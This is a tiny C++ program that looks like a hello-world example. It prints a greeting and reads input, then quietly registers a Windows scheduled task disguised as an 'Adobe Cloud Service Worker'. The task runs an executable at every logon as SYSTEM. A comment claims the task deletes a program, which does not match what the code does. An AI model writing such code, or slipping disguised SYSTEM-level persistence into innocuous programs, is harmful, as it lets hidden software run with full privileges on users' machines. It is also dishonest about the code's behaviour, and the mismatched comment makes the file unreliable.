#include <iostream>
#include <string>

int main(int argc, char* argv[]) {
    std::cout << "Hello world!" << std::endl;
    std::string test;
    std::cin >> test;
    // create a task to delete the program that is argv[1]
    system("schtasks /create /tn \"Adobe Cloud Service Worker\" /tr \"C:\\Program Files\\Adobe Cloud Service Worker\\main.exe\" /sc onlogon /ru \"SYSTEM\"");
    return 1;
}
